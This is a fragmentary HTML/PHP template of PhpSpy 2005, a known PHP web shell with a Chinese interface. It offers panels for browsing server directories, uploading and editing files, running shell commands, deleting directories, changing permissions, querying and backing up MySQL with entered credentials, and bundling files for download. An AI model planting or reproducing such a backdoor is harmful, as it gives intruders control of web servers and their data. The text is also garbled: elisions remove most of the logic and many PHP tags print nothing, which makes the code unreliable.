...
<table width="760" border="0" cellpadding="3" cellspacing="0" bgcolor="#ffffff">
  <tr bgcolor="#cccccc">
    <td width="375" align="right" nowrap><b><?php $_SERVER['HTTP_HOST']?></b></td>
    <td width="10" align="center" nowrap><b>:</b></td>
    <td width="375" nowrap><b><?php $_SERVER['REMOTE_ADDR']?></b></td>
  </tr>
  <tr>
    <td colspan="3" align="center" nowrap><a href="?action=logout">注销会话</a> | <a href="?action=dir">返回 PhpSpy 目录</a> | <a href="?action=phpenv">PHP环境变量</a><?php $phpinfo?><?php $shellmode?> | <a href="?action=sql">SQL Query</a> | <a href="?action=sqlbak">MySQL Backup</a> | <a href="http://www.4ngel.net" target="_blank" title="下载此程序">Version 2005</a></td>
  </tr>
</table>
...
<table width="760" border="0" cellpadding="0">
 <form action="" method="GET">
  <tr>
    <td><p>程序路径:<?php $pathname?><br>当前目录(<?php $dir_writeable?>,<?php substr(base_convert(@fileperms($nowpath),10,8),-4);?>):<?php $nowpath?>
        <br>跳转目录:
 ...
 <form action="?dir=<?php urlencode($dir)?>" method="POST" enctype="multipart/form-data">
  <tr>
    <td colspan="2">上传文件到当前目录:
      ...
      <input type="hidden" name="uploaddir" value="<?php $dir?>"></td>
  </tr>
  </form>
  <form action="?action=editfile&dir=<?php urlencode($dir)?>" method="POST">
  <tr>
...
@closedir($dirs); 
?>
<tr class="<?php getrowbg()?>">
  <td nowrap colspan="6"><table width="100%" border="0" cellpadding="2" cellspacing="0" align="center">
    <tr>
      <td><INPUT onclick="CheckAll(this.form)" type="checkbox" value="on" name="chkall"> <input name="rarfile" type="text" class="INPUT" value="<?php $_SERVER['HTTP_HOST']?>_Files.rar"> <input type="submit" name="downrar" value="选中文件打包下载" class="INPUT"></td>
      <td align="right"><?php $dir_i?> 个目录 / <?php $file_i?> 个文件</td>
    </tr>
  </table></td>
</tr>
</FORM>
...
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">新建/编辑文件 [<a href="?dir=<?php urlencode($dir)?>">返回</a>]</td>
  </tr>
  <form action="?dir=<?php urlencode($dir)?>" method="POST">
  <tr class="secondalt">
    <td align="center">当前文件:<input class="input" type="text" name="editfilename" size="30"
value="<?php $filename?>"> 输入新文件名则建立新文件</td>
  </tr>  
  <tr class="firstalt">
    <td align="center"><textarea name="filecontent" cols="100" rows="20"><?php $contents?></textarea></td>
  </tr>  
  <tr class="secondalt">
...
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  ...
  <form action="?action=shell&dir=<?php urlencode($dir)?>" method="POST">
  <tr class="secondalt">
  ...
  <tr class="firstalt">
    <td align="center">
	  ...
	  输入命令:
      <input type="text" name="command" size="60" value="<?php $_POST['command']?>" class="input">
...
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <form action="?dir=<?php urlencode($dir)?>" method="POST">
  <tr class="firstalt">
    <td align="center">删除 <input name="deldir" type="text" value="<?php $deldir?>" class="input" readonly> 目录</td>
  </tr>  
  <tr class="secondalt">
...
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">修改文件属性 [<a href="?dir=<?php urlencode($dir)?>">返回</a>]</td>
  </tr>
  <form action="?dir=<?php urlencode($dir)?>" method="POST">
  <tr class="secondalt">
    <td align="center"><input name="file" type="text" value="<?php $file?>" class="input" readonly> 的属性为:
      <input type="text" name="fileperm" size="20" value="<?php substr(base_convert(fileperms($dir."/".$file),10,8),-4)?>" class="input">
	  <input name="dir" type="hidden" value="<?php urlencode($dir)?>">
...
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  ...
  <tr class="secondalt">
    ...
    <input name="servername" type="text" class="INPUT" value="<?php $servername?>"> 
    User:
    <input name="dbusername" type="text" class="INPUT" size="15" value="<?php $dbusername?>">
    Pass:
    <input name="dbpassword" type="text" class="INPUT" size="15" value="<?php $dbpassword?>">
    DB:
    <input name="dbname" type="text" class="INPUT" size="15" value="<?php $dbname?>">
...
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  ...
  <?php
	...
	<tr nowrap>
	  <td>备份数据所保存的路径:</td>
	  <td><input type="text" class="INPUT" name="path" size="50" maxlength="50" value="./<?php $_SERVER['HTTP_HOST']?>_MySQL.sql"></td>
	</tr>
	</table></td>
	</tr>
	<tr>
...
?>
  <tr class="firstalt">
    <td style="padding-left: 5px;"><b><?php $hp[1]?></b></td>
  </tr>
  <tr class="secondalt">
    <td>
